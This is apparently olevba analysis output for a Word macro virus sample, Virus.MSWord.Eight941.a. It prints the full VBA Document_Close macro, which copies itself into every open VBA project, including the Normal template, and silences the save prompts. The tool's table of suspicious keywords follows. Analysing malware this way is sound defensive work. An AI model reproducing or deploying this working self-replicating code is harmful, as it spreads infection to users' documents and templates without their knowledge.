olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Eight941.a-11d4905e331ce23bff63d6433d4260ecbcda8f3b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Eight941.a-11d4905e331ce23bff63d6433d4260ecbcda8f3b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































Private Sub Document_Close()
On Error Resume Next
Dim i, j As Integer
Dim k, l As Integer
j = -1

    For i = 1 To Application.VBE.VBProjects.Count
        If Application.VBE.VBProjects(i).Name = "Normal" Then
            j = i
        End If
        If Not Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Close", 0, 0, 1000, 1000) Then
              If j > 0 Then
                    If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Close", 0, 0, 1000, 1000) Then
                        k = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Close", vbext_pk_Proc)
                        l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                        Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(k, k + l)
                    Else
                        k = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Close", vbext_pk_Proc)
                        l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                        Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(k, k + l)
                    End If
                End If
        End If
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
           
    Next i

End Sub

































'


    
    






























































'


    
    


























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

